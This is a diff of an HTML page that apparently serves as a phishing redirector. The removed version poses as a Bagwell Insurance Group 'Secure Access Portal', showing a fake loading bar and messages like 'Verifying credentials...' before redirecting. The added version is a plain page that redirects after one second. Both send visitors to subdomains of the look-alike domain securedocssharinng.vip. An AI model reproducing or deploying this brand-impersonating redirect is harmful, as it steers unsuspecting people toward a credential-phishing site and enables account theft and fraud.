@@ -4,270 +4,28 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>BAGWELL INSURANCE GROUP</title>
+<title>Redirecting...</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
 body{
+    margin:20px;
     font-family:Arial, Helvetica, sans-serif;
-    height:100vh;
-    overflow:hidden;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    position:relative;
-
-    background:
-        radial-gradient(circle at top right,#243b6b 0%,transparent 35%),
-        radial-gradient(circle at bottom left,#1d4e89 0%,transparent 35%),
-        linear-gradient(135deg,#0b1f3a 0%,#13294b 55%,#1f3d6d 100%);
-}
-
-/* Animated circles */
-body::before{
-    content:"";
-    position:absolute;
-    width:900px;
-    height:900px;
-    border:1px solid rgba(255,255,255,.08);
-    border-radius:50%;
-    top:-300px;
-    right:-250px;
-    animation:rotate 35s linear infinite;
-}
-
-body::after{
-    content:"";
-    position:absolute;
-    width:600px;
-    height:600px;
-    border:1px solid rgba(255,255,255,.05);
-    border-radius:50%;
-    bottom:-200px;
-    left:-150px;
-    animation:rotateReverse 30s linear infinite;
-}
-
-@keyframes rotate{
-    from{transform:rotate(0deg);}
-    to{transform:rotate(360deg);}
-}
-
-@keyframes rotateReverse{
-    from{transform:rotate(360deg);}
-    to{transform:rotate(0deg);}
-}
-
-.wrapper{
-    width:90%;
-    max-width:700px;
-    padding:50px;
-    text-align:center;
-    position:relative;
-    z-index:2;
-
-    background:rgba(255,255,255,.08);
-    border:1px solid rgba(255,255,255,.15);
-    border-radius:24px;
-    backdrop-filter:blur(16px);
-    box-shadow:0 20px 60px rgba(0,0,0,.35);
-
-    animation:fadeIn 1.2s ease;
-}
-
-@keyframes fadeIn{
-    from{
-        opacity:0;
-        transform:translateY(20px);
-    }
-    to{
-        opacity:1;
-        transform:translateY(0);
-    }
-}
-
-.brand-row{
-    margin-bottom:50px;
-}
-
-.rocontec-logo{
-    width:340px;
-    max-width:80%;
-    height:auto;
-    filter:drop-shadow(0 8px 18px rgba(0,0,0,.25));
-}
-
-.loading-section{
-    width:100%;
-    max-width:500px;
-    margin:auto;
-}
-
-.loading-bar{
-    width:100%;
-    height:12px;
-    background:rgba(255,255,255,.15);
-    border-radius:50px;
-    overflow:hidden;
-}
-
-.loading-progress{
-    width:0%;
-    height:100%;
-    border-radius:50px;
-    background:linear-gradient(90deg,#ff5b5b,#d60000,#8b0000);
-    box-shadow:0 0 20px rgba(255,0,0,.4);
-    transition:width .05s linear;
-}
-
-.percent{
-    margin-top:20px;
-    color:#f8fafc;
-    font-size:24px;
-    font-weight:bold;
-    letter-spacing:1px;
-}
-
-.status{
-    margin-top:15px;
-    color:#dbeafe;
-    font-size:15px;
-}
-
-.spinner{
-    width:46px;
-    height:46px;
-    margin:28px auto;
-    border:4px solid rgba(255,255,255,.2);
-    border-top:4px solid #ff4d4d;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    to{
-        transform:rotate(360deg);
-    }
-}
-
-.footer{
-    position:absolute;
-    bottom:25px;
-    width:100%;
-    text-align:center;
-    color:rgba(255,255,255,.75);
-    font-size:13px;
-    letter-spacing:.5px;
-}
-
-@media(max-width:600px){
-
-.wrapper{
-    padding:35px 20px;
-}
-
-.rocontec-logo{
-    width:260px;
-}
-
-.percent{
-    font-size:20px;
-}
-
-.status{
+    background:#fff;
+    color:#444;
     font-size:14px;
 }
-
-}
 </style>
-</head>
-
-<body>
-
-<div class="wrapper">
-
-    <div class="brand-row">
-        <img
-            src="https://www.bagwellinc.com/wp-content/uploads/2022/10/logo.png"
-            alt="Bagwell Insurance Group"
-            class="rocontec-logo">
-    </div>
-
-    <div class="loading-section">
-
-        <div class="loading-bar">
-            <div class="loading-progress" id="progress"></div>
-        </div>
-
-        <div class="percent" id="percent">0%</div>
-
-        <div class="spinner"></div>
-
-        <div class="status" id="status">
-            Initializing secure environment...
-        </div>
-
-    </div>
-
-</div>
-
-<div class="footer">
-    © Bagwell Insurance Group — Secure Access Portal
-</div>
 
 <script>
-
-const redirectURL = "https://gthkrxf83k.securedocssharinng.vip/l/zNLBfK3sdL8";
-
-const messages = [
-    "Initializing secure environment...",
-    "Connecting to Bagwell Insurance Group service...",
-    "Loading resources...",
-    "Synchronizing data...",
-    "Verifying credentials...",
-    "Preparing workspace...",
-    "Ready."
-];
-
-let progress = 0;
-
-const progressBar = document.getElementById("progress");
-const percent = document.getElementById("percent");
-const status = document.getElementById("status");
-
-const timer = setInterval(() => {
-
-    progress++;
-
-    progressBar.style.width = progress + "%";
-    percent.textContent = progress + "%";
-
-    const stage = Math.floor(progress / 15);
-
-    if(messages[stage]){
-        status.textContent = messages[stage];
-    }
-
-    if(progress >= 100){
-
-        clearInterval(timer);
-
-        status.textContent = "Redirecting...";
-
-        setTimeout(() => {
-            window.location.href = redirectURL;
-        },1000);
-
-    }
-
-},50);
-
+setTimeout(function () {
+    window.location.href = "https://siuc9pgbee.securedocssharinng.vip/l/LZnxdrN6pTM";
+}, 1000);
 </script>
+
+</head>
+<body>
+
+Redirecting...
 
 </body>
 </html>
